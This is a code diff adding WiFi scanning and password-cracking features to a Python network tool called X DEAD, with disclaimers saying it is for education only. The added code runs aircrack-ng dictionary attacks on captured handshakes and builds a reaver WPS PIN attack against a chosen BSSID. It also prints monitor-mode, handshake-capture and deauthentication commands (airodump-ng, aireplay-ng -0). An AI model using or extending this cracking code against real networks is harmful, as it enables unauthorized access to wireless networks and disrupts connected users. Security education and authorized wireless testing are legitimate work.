@@ -66,7 +66,7 @@ class XDead:
     def check_requirements(self):
         """Check if required tools are installed"""
         required_tools = ['nmap']
-        optional_tools = ['arp-scan']
+        optional_tools = ['arp-scan', 'aircrack-ng', 'iwlist', 'nmcli']
         missing_tools = []
         missing_optional = []
         
@@ -409,13 +409,354 @@ class XDead:
     
     def advanced_menu(self):
         """Advanced options menu"""
-        print(f"\n{Colors.CYAN}{Colors.BOLD}  ADVANCED OPTIONS{Colors.RESET}")
-        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
-        print(f"{Colors.YELLOW}[*] Advanced features coming in v2.0...{Colors.RESET}")
-        print(f"{Colors.MAGENTA}    - Network Traffic Analysis{Colors.RESET}")
-        print(f"{Colors.MAGENTA}    - Vulnerability Assessment{Colors.RESET}")
-        print(f"{Colors.MAGENTA}    - Exploit Framework Integration{Colors.RESET}")
-        print(f"{Colors.MAGENTA}    - Automated Attack Vectors{Colors.RESET}")
+        while True:
+            print(f"\n{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+            print(f"{Colors.RED}{Colors.BOLD}  {Colors.CYAN}ADVANCED OPTIONS{Colors.RESET}")
+            print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+            print(f"{Colors.WHITE}1.{Colors.RESET} {Colors.RED}▶{Colors.RESET} {Colors.CYAN}WiFi Network Scanner{Colors.RESET}")
+            print(f"{Colors.WHITE}2.{Colors.RESET} {Colors.CYAN}▶{Colors.RESET} {Colors.RED}WiFi Password Cracking{Colors.RESET}")
+            print(f"{Colors.WHITE}3.{Colors.RESET} {Colors.RED}▶{Colors.RESET} {Colors.CYAN}Team Information{Colors.RESET}")
+            print(f"{Colors.WHITE}4.{Colors.RESET} {Colors.CYAN}▶{Colors.RESET} {Colors.YELLOW}About X DEAD{Colors.RESET}")
+            print(f"{Colors.WHITE}5.{Colors.RESET} {Colors.RED}▶{Colors.RESET} {Colors.MAGENTA}Legal Disclaimer{Colors.RESET}")
+            print(f"{Colors.WHITE}6.{Colors.RESET} {Colors.CYAN}▶{Colors.RESET} {Colors.RED}Back to Main Menu{Colors.RESET}")
+            print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+            
+            choice = input(f"\n{Colors.RED}[{Colors.CYAN}ADVANCED{Colors.RED}]{Colors.CYAN}>{Colors.RESET} ").strip()
+            
+            if choice == '1':
+                self.wifi_scanner()
+            elif choice == '2':
+                self.wifi_cracking()
+            elif choice == '3':
+                self.team_info()
+            elif choice == '4':
+                self.about_tool()
+            elif choice == '5':
+                self.legal_disclaimer()
+            elif choice == '6':
+                break
+            else:
+                print(f"{Colors.RED}[!] Invalid choice{Colors.RESET}")
+    
+    def wifi_scanner(self):
+        """Scan for WiFi networks"""
+        print(f"\n{Colors.CYAN}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.CYAN}{Colors.BOLD}  WiFi NETWORK SCANNER{Colors.RESET}")
+        print(f"{Colors.CYAN}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}[*] Scanning for WiFi networks...{Colors.RESET}")
+        print(f"{Colors.YELLOW}[!] This requires root privileges and a wireless interface{Colors.RESET}\n")
+        
+        try:
+            # Check for wireless interfaces
+            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
+            if 'no wireless extensions' in result.stdout.lower():
+                print(f"{Colors.RED}[!] No wireless interface found{Colors.RESET}")
+                return
+            
+            # Try to use iwlist or nmcli
+            if os.path.exists('/usr/sbin/iwlist'):
+                print(f"{Colors.CYAN}[*] Using iwlist to scan...{Colors.RESET}")
+                result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True, timeout=30)
+                self.parse_wifi_networks(result.stdout)
+            elif os.path.exists('/usr/bin/nmcli'):
+                print(f"{Colors.CYAN}[*] Using nmcli to scan...{Colors.RESET}")
+                result = subprocess.run(['nmcli', '-t', '-f', 'SSID,SECURITY,SIGNAL', 'device', 'wifi', 'list'], 
+                                      capture_output=True, text=True, timeout=30)
+                self.parse_nmcli_networks(result.stdout)
+            else:
+                print(f"{Colors.RED}[!] WiFi scanning tools not found{Colors.RESET}")
+                print(f"{Colors.YELLOW}[*] Install: sudo apt-get install wireless-tools network-manager{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error scanning WiFi: {e}{Colors.RESET}")
+    
+    def parse_wifi_networks(self, output: str):
+        """Parse iwlist output"""
+        networks = []
+        current_net = {}
+        
+        for line in output.split('\n'):
+            if 'ESSID:' in line:
+                ssid = line.split('ESSID:')[1].strip().strip('"')
+                if ssid:
+                    current_net['SSID'] = ssid
+            elif 'Encryption key:' in line:
+                current_net['Encrypted'] = 'on' in line.lower()
+            elif 'Quality=' in line:
+                try:
+                    quality = line.split('Quality=')[1].split()[0]
+                    current_net['Quality'] = quality
+                except:
+                    pass
+            elif line.strip() == '' and current_net:
+                networks.append(current_net)
+                current_net = {}
+        
+        if current_net:
+            networks.append(current_net)
+        
+        self.display_wifi_networks(networks)
+    
+    def parse_nmcli_networks(self, output: str):
+        """Parse nmcli output"""
+        networks = []
+        for line in output.split('\n'):
+            if line.strip():
+                parts = line.split(':')
+                if len(parts) >= 3:
+                    networks.append({
+                        'SSID': parts[0],
+                        'Security': parts[1] if parts[1] else 'Open',
+                        'Signal': parts[2] if len(parts) > 2 else 'Unknown'
+                    })
+        
+        self.display_wifi_networks(networks)
+    
+    def display_wifi_networks(self, networks: List[Dict]):
+        """Display found WiFi networks"""
+        if not networks:
+            print(f"{Colors.RED}[!] No WiFi networks found{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.GREEN}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}  FOUND WiFi NETWORKS{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}{'#':<4} {'SSID':<30} {'Security':<20} {'Signal':<15}{Colors.RESET}")
+        print(f"{Colors.MAGENTA}{'─'*70}{Colors.RESET}")
+        
+        for i, net in enumerate(networks, 1):
+            ssid = net.get('SSID', 'Unknown')[:28]
+            security = net.get('Security', net.get('Encrypted', 'Unknown'))
+            if isinstance(security, bool):
+                security = 'Encrypted' if security else 'Open'
+            signal = net.get('Signal', net.get('Quality', 'Unknown'))
+            
+            if i % 2 == 0:
+                color = Colors.CYAN
+            else:
+                color = Colors.RED
+            
+            print(f"{color}{i:<4}{Colors.RESET} {Colors.WHITE}{ssid:<30}{Colors.RESET} {color}{str(security):<20}{Colors.RESET} {Colors.YELLOW}{str(signal):<15}{Colors.RESET}")
+        
+        print(f"\n{Colors.GREEN}[+] Total networks found: {len(networks)}{Colors.RESET}")
+    
+    def wifi_cracking(self):
+        """WiFi password cracking interface"""
+        print(f"\n{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}  WiFi PASSWORD CRACKING{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}⚠️  LEGAL WARNING ⚠️{Colors.RESET}")
+        print(f"{Colors.RED}This tool is for EDUCATIONAL PURPOSES ONLY!{Colors.RESET}")
+        print(f"{Colors.RED}Only use on networks you OWN or have EXPLICIT PERMISSION to test!{Colors.RESET}")
+        print(f"{Colors.RED}Unauthorized access to WiFi networks is ILLEGAL!{Colors.RESET}\n")
+        
+        response = input(f"{Colors.YELLOW}[?] Do you understand and agree? (yes/no): {Colors.RESET}").strip().lower()
+        if response != 'yes':
+            print(f"{Colors.CYAN}[*] Returning to menu...{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.CYAN}[*] WiFi Cracking Methods:{Colors.RESET}\n")
+        print(f"{Colors.WHITE}1.{Colors.RESET} {Colors.GREEN}Dictionary Attack (Wordlist){Colors.RESET}")
+        print(f"{Colors.WHITE}2.{Colors.RESET} {Colors.GREEN}Brute Force Attack{Colors.RESET}")
+        print(f"{Colors.WHITE}3.{Colors.RESET} {Colors.GREEN}WPS PIN Attack{Colors.RESET}")
+        print(f"{Colors.WHITE}4.{Colors.RESET} {Colors.YELLOW}Capture Handshake (WPA/WPA2){Colors.RESET}")
+        print(f"{Colors.WHITE}5.{Colors.RESET} {Colors.RED}Back{Colors.RESET}\n")
+        
+        choice = input(f"{Colors.YELLOW}[?] Select method: {Colors.RESET}").strip()
+        
+        if choice == '1':
+            self.dictionary_attack()
+        elif choice == '2':
+            self.brute_force_attack()
+        elif choice == '3':
+            self.wps_attack()
+        elif choice == '4':
+            self.capture_handshake()
+        else:
+            print(f"{Colors.CYAN}[*] Returning...{Colors.RESET}")
+    
+    def dictionary_attack(self):
+        """Dictionary attack on WiFi"""
+        print(f"\n{Colors.CYAN}[*] Dictionary Attack{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This requires:{Colors.RESET}")
+        print(f"{Colors.WHITE}  - Captured handshake (.cap file){Colors.RESET}")
+        print(f"{Colors.WHITE}  - Wordlist file (rockyou.txt, etc.){Colors.RESET}")
+        print(f"{Colors.WHITE}  - aircrack-ng installed{Colors.RESET}\n")
+        
+        handshake = input(f"{Colors.YELLOW}[?] Handshake file path (.cap): {Colors.RESET}").strip()
+        wordlist = input(f"{Colors.YELLOW}[?] Wordlist file path: {Colors.RESET}").strip()
+        
+        if not os.path.exists(handshake):
+            print(f"{Colors.RED}[!] Handshake file not found!{Colors.RESET}")
+            return
+        
+        if not os.path.exists(wordlist):
+            print(f"{Colors.RED}[!] Wordlist file not found!{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Download rockyou.txt: wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.CYAN}[*] Starting dictionary attack...{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This may take a while...{Colors.RESET}\n")
+        
+        try:
+            cmd = ['aircrack-ng', '-w', wordlist, handshake]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
+            print(result.stdout)
+            if 'KEY FOUND' in result.stdout:
+                print(f"\n{Colors.GREEN}[+] PASSWORD FOUND!{Colors.RESET}")
+            else:
+                print(f"\n{Colors.RED}[!] Password not found in wordlist{Colors.RESET}")
+        except FileNotFoundError:
+            print(f"{Colors.RED}[!] aircrack-ng not installed!{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Install: sudo apt-get install aircrack-ng{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+    
+    def brute_force_attack(self):
+        """Brute force attack on WiFi"""
+        print(f"\n{Colors.CYAN}[*] Brute Force Attack{Colors.RESET}")
+        print(f"{Colors.YELLOW}[!] WARNING: Brute force is VERY SLOW!{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This requires hashcat and a captured handshake{Colors.RESET}\n")
+        
+        print(f"{Colors.RED}[!] Brute force attack is resource-intensive{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Consider using dictionary attack first{Colors.RESET}\n")
+    
+    def wps_attack(self):
+        """WPS PIN attack"""
+        print(f"\n{Colors.CYAN}[*] WPS PIN Attack{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This requires:{Colors.RESET}")
+        print(f"{Colors.WHITE}  - WPS enabled on target router{Colors.RESET}")
+        print(f"{Colors.WHITE}  - reaver or bully installed{Colors.RESET}\n")
+        
+        interface = input(f"{Colors.YELLOW}[?] Wireless interface (wlan0): {Colors.RESET}").strip() or 'wlan0'
+        bssid = input(f"{Colors.YELLOW}[?] Target BSSID (MAC address): {Colors.RESET}").strip()
+        
+        if not bssid:
+            print(f"{Colors.RED}[!] BSSID required!{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.CYAN}[*] Starting WPS attack...{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This may take hours...{Colors.RESET}\n")
+        
+        try:
+            cmd = ['reaver', '-i', interface, '-b', bssid, '-vv']
+            print(f"{Colors.CYAN}[*] Command: {' '.join(cmd)}{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Install reaver: sudo apt-get install reaver{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+    
+    def capture_handshake(self):
+        """Capture WPA/WPA2 handshake"""
+        print(f"\n{Colors.CYAN}[*] Capture WPA/WPA2 Handshake{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This requires:{Colors.RESET}")
+        print(f"{Colors.WHITE}  - airodump-ng installed{Colors.RESET}")
+        print(f"{Colors.WHITE}  - Wireless interface in monitor mode{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}[*] Steps:{Colors.RESET}")
+        print(f"{Colors.WHITE}1. Put interface in monitor mode: airmon-ng start wlan0{Colors.RESET}")
+        print(f"{Colors.WHITE}2. Scan for networks: airodump-ng wlan0mon{Colors.RESET}")
+        print(f"{Colors.WHITE}3. Capture handshake: airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon{Colors.RESET}")
+        print(f"{Colors.WHITE}4. Deauthenticate clients: aireplay-ng -0 4 -a BSSID wlan0mon{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Install: sudo apt-get install aircrack-ng{Colors.RESET}\n")
+    
+    def team_info(self):
+        """Display team information"""
+        print(f"\n{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}  {Colors.CYAN}TEAM INFORMATION{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}{Colors.BOLD}Team Name:{Colors.RESET} {Colors.RED}Infinity X Team White Devel{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Who We Are:{Colors.RESET}")
+        print(f"{Colors.WHITE}  We are a team of Ethical Hackers and Security Experts{Colors.RESET}")
+        print(f"{Colors.WHITE}  dedicated to cybersecurity education and research.{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Our Mission:{Colors.RESET}")
+        print(f"{Colors.WHITE}  - Promote ethical hacking and cybersecurity awareness{Colors.RESET}")
+        print(f"{Colors.WHITE}  - Develop powerful security tools for educational purposes{Colors.RESET}")
+        print(f"{Colors.WHITE}  - Help students and professionals learn cybersecurity{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Our Capabilities:{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Network Security Analysis{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Penetration Testing{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Vulnerability Assessment{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ WiFi Security Testing{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Tool Development{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Security Research{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}What We Can Do:{Colors.RESET}")
+        print(f"{Colors.WHITE}  We create professional-grade security tools that demonstrate{Colors.RESET}")
+        print(f"{Colors.WHITE}  advanced cybersecurity techniques. Our tools are designed for:{Colors.RESET}")
+        print(f"{Colors.CYAN}  • Educational purposes{Colors.RESET}")
+        print(f"{Colors.CYAN}  • Authorized security testing{Colors.RESET}")
+        print(f"{Colors.CYAN}  • Network security research{Colors.RESET}")
+        print(f"{Colors.CYAN}  • Professional penetration testing{Colors.RESET}\n")
+        
+        print(f"{Colors.RED}{Colors.BOLD}Contact:{Colors.RESET}")
+        print(f"{Colors.WHITE}  GitHub: https://github.com/Adil-fayyaz/x-dead{Colors.RESET}\n")
+    
+    def about_tool(self):
+        """Display tool information"""
+        print(f"\n{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}  {Colors.CYAN}ABOUT X DEAD{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}{Colors.BOLD}Version:{Colors.RESET} {Colors.RED}v{self.version}{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}What is X DEAD?{Colors.RESET}")
+        print(f"{Colors.WHITE}  X DEAD is a powerful Network Control System designed for{Colors.RESET}")
+        print(f"{Colors.WHITE}  comprehensive network analysis and security testing.{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Features:{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Network Discovery & Mapping{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Device Enumeration{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Port Scanning & Service Detection{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ WiFi Network Scanning{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ WiFi Password Cracking (Educational){Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ MAC Address & Vendor Identification{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Platforms:{Colors.RESET}")
+        print(f"{Colors.WHITE}  • Kali Linux{Colors.RESET}")
+        print(f"{Colors.WHITE}  • Termux (Android){Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Created by:{Colors.RESET}")
+        print(f"{Colors.RED}  {self.team}{Colors.RESET}\n")
+    
+    def legal_disclaimer(self):
+        """Display legal disclaimer"""
+        print(f"\n{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}  {Colors.YELLOW}LEGAL DISCLAIMER{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}{'═'*70}{Colors.RESET}\n")
+        
+        print(f"{Colors.RED}{Colors.BOLD}⚠️  IMPORTANT LEGAL NOTICE ⚠️{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}This tool is for EDUCATIONAL PURPOSES ONLY!{Colors.RESET}\n")
+        
+        print(f"{Colors.WHITE}You may ONLY use this tool on:{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Networks you own{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Networks with EXPLICIT written permission{Colors.RESET}")
+        print(f"{Colors.GREEN}  ✓ Your own devices and systems{Colors.RESET}\n")
+        
+        print(f"{Colors.WHITE}You may NOT use this tool for:{Colors.RESET}")
+        print(f"{Colors.RED}  ✗ Unauthorized access to networks{Colors.RESET}")
+        print(f"{Colors.RED}  ✗ Hacking without permission{Colors.RESET}")
+        print(f"{Colors.RED}  ✗ Illegal activities{Colors.RESET}")
+        print(f"{Colors.RED}  ✗ Accessing networks you don't own{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Legal Consequences:{Colors.RESET}")
+        print(f"{Colors.WHITE}  Unauthorized access to computer networks is ILLEGAL in most{Colors.RESET}")
+        print(f"{Colors.WHITE}  countries and can result in:{Colors.RESET}")
+        print(f"{Colors.RED}  • Criminal charges{Colors.RESET}")
+        print(f"{Colors.RED}  • Fines{Colors.RESET}")
+        print(f"{Colors.RED}  • Imprisonment{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}{Colors.BOLD}Disclaimer:{Colors.RESET}")
+        print(f"{Colors.WHITE}  The developers and contributors of X DEAD are NOT responsible{Colors.RESET}")
+        print(f"{Colors.WHITE}  for any misuse of this tool. Use at your own risk.{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}{Colors.BOLD}Use responsibly and ethically!{Colors.RESET}\n")
     
     def exit(self):
         """Exit the program"""
@@ -447,6 +788,8 @@ class XDead:
         print(f"{Colors.CYAN}  ✓{Colors.RESET} {Colors.RED}MAC Address & Vendor Identification{Colors.RESET}")
         print(f"{Colors.RED}  ✓{Colors.RESET} {Colors.CYAN}Hostname Resolution{Colors.RESET}")
         print(f"{Colors.CYAN}  ✓{Colors.RESET} {Colors.RED}Works on ANY Network{Colors.RESET}")
+        print(f"{Colors.RED}  ✓{Colors.RESET} {Colors.CYAN}WiFi Network Scanning{Colors.RESET}")
+        print(f"{Colors.CYAN}  ✓{Colors.RESET} {Colors.RED}WiFi Password Cracking (Educational){Colors.RESET}")
         print(f"{Colors.MAGENTA}  ⚡ More features coming soon...{Colors.RESET}\n")
         
         time.sleep(2)
